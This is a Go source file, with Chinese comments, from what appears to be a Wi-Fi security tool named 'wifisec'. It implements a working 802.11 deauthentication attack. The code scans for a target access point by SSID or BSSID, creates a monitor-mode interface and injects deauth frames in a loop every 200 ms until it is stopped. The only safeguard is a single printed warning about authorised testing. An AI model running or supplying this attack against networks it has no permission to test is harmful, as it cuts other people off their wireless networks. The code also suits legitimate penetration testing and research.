package functions

import (
	"context"
	"errors"
	"fmt"
	"net"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"wifisec/internal/ieee80211"
	platformlinux "wifisec/internal/platform/linux"
	"wifisec/internal/security"
	"wifisec/internal/utilities"
)

const (
	// sendInterval 是每轮向所有目标发送 deauth 帧后的固定间隔。
	sendInterval = 200 * time.Millisecond
)

// WifiDeauther 对指定 SSID/BSSID 的 AP 持续广播 802.11 deauthentication 帧。
// 用法：wifisec deauth <ssid|bssid> [iface]
// 仅支持 Linux；需要 root；Ctrl-C 停止并清理现场。
func WifiDeauther(arguments []string) error {
	if utilities.GetOS() != utilities.Linux {
		return fmt.Errorf("deauth 仅支持 Linux（当前平台：%s）", utilities.GetOS())
	}

	if err := (security.RootChecker{}).Check(); err != nil {
		return err
	}

	if len(arguments) < 1 || strings.TrimSpace(arguments[0]) == "" {
		return errors.New("用法：wifisec deauth <ssid|bssid> [iface]，可先用 list 查看周边网络")
	}

	target := strings.TrimSpace(arguments[0])
	ifaceName := ""
	if len(arguments) > 1 {
		ifaceName = strings.TrimSpace(arguments[1])
	}

	// 判定目标是 BSSID 还是 SSID；BSSID 归一化为小写冒号分隔。
	targetMAC, err := net.ParseMAC(target)
	if err != nil {
		targetMAC = nil // 视为 SSID
	}

	// 选定无线接口；未指定时取第一块可用。
	iface, err := selectWirelessInterface(ifaceName)
	if err != nil {
		return err
	}

	if iface.Mode == "managed" && iface.State == "UP" {
		utilities.Warn("接口 %s 当前处于 managed 模式且已连接，进入 monitor 模式将断开当前 Wi-Fi 连接", iface.Name)
	}

	// 扫描并锁定目标 AP。
	scanned, err := platformlinux.Scan(iface.Name)
	if err != nil {
		return fmt.Errorf("扫描失败：%w", err)
	}

	targets := SelectDeauthTargets(scanned, target, targetMAC)
	if len(targets) == 0 {
		return fmt.Errorf("未找到目标 %s，请确认 SSID/BSSID 正确且目标在信号范围内", target)
	}

	// 按信道分组并预生成帧，避免每轮重复构造。
	type deauthTarget struct {
		channel int
		bssid   string
		frame   []byte
	}

	deauthTargets := make([]deauthTarget, 0, len(targets))
	for _, ap := range targets {
		bssid := net.HardwareAddr(normalizeMAC(ap.BSSID))
		if len(bssid) != 6 {
			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
			continue
		}

		frame, err := ieee80211.BuildDeauthFrame(bssid)
		if err != nil {
			utilities.Warn("构造 deauth 帧失败（BSSID %s）：%v", ap.BSSID, err)
			continue
		}

		deauthTargets = append(deauthTargets, deauthTarget{
			channel: ap.Channel,
			bssid:   normalizeMAC(ap.BSSID),
			frame:   frame,
		})
	}

	if len(deauthTargets) == 0 {
		return errors.New("所有目标的 BSSID 均无法解析，无法发送 deauth 帧")
	}

	// 准备 monitor 接口：若原接口已是 monitor 模式则直接用，不创建也不删；
	// 否则新建并在退出时删除。
	monitorName, ownMonitor, err := prepareMonitor(iface)
	if err != nil {
		return err
	}
	if ownMonitor {
		defer func() {
			if err := platformlinux.DeleteInterface(monitorName); err != nil {
				utilities.Warn("清理 monitor 接口 %s 失败：%v", monitorName, err)
			}
		}()
	}

	injector, err := platformlinux.OpenInjector(monitorName)
	if err != nil {
		return err
	}
	defer injector.Close()

	// 接管 SIGINT/SIGTERM：main 包注册的全局信号处理器会无条件 os.Exit(0)，
	// 不 reset 则没有机会清理 monitor 接口。
	signal.Reset(syscall.SIGINT, syscall.SIGTERM)
	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	utilities.Info("开始 deauth 攻击：接口 %s · 目标 %d 个 · 间隔 %s", monitorName, len(deauthTargets), sendInterval)
	utilities.Warn("仅用于授权测试，请确保目标网络为你所有或已获书面许可")

	started := time.Now()
	sent := 0

	// 持续轮发，直到 Ctrl-C。
	for {
		for _, t := range deauthTargets {
			if ctx.Err() != nil {
				break
			}

			if err := platformlinux.SetChannel(monitorName, t.channel); err != nil {
				utilities.Warn("信道 %d 不可用，跳过 %s：%v", t.channel, t.bssid, err)
				continue
			}

			if err := injector.Write(t.frame); err != nil {
				utilities.Warn("发送 deauth 帧失败（%s）：%v", t.bssid, err)
				continue
			}

			sent++
		}

		select {
		case <-ctx.Done():
			fmt.Printf("\r已发送 %d 帧 · 目标 %d 个 · 运行 %s\n", sent, len(deauthTargets), time.Since(started).Round(time.Second))
			return nil
		case <-time.After(sendInterval):
		}
	}
}

// selectWirelessInterface 按名字选择接口；空名字则取第一块可用。
func selectWirelessInterface(name string) (*WirelessInterface, error) {
	devices, err := FindAllWirelessInterfaces()
	if err != nil {
		return nil, err
	}

	if len(devices) == 0 {
		return nil, errors.New("未发现可用无线接口")
	}

	if name == "" {
		return &devices[0], nil
	}

	for i := range devices {
		if devices[i].Name == name {
			return &devices[i], nil
		}
	}

	return nil, fmt.Errorf("接口 %s 不存在或不是无线接口", name)
}

// SelectDeauthTargets 按 SSID（精确）或 BSSID（归一化后比较）筛选扫描结果。
// 导出供 tests/ 做表驱动测试。
func SelectDeauthTargets(scanned []platformlinux.Network, target string, targetMAC net.HardwareAddr) []platformlinux.Network {
	var result []platformlinux.Network

	for _, ap := range scanned {
		if targetMAC != nil {
			if normalizeMAC(ap.BSSID) == normalizeMAC(targetMAC.String()) {
				result = append(result, ap)
			}
			continue
		}

		if ap.SSID == target {
			result = append(result, ap)
		}
	}

	return result
}

// prepareMonitor 返回可用的 monitor 接口名与是否为本进程创建。
// 已是 monitor 模式的接口直接复用（own=false）；否则新建（own=true）。
func prepareMonitor(iface *WirelessInterface) (string, bool, error) {
	if iface.Mode == "monitor" {
		return iface.Name, false, nil
	}

	name, err := platformlinux.CreateMonitor(iface.PHY)
	if err != nil {
		return "", false, err
	}

	if err := platformlinux.SetInterfaceUp(name); err != nil {
		// 建口成功但启用失败，回滚删除。
		_ = platformlinux.DeleteInterface(name)
		return "", false, err
	}

	return name, true, nil
}
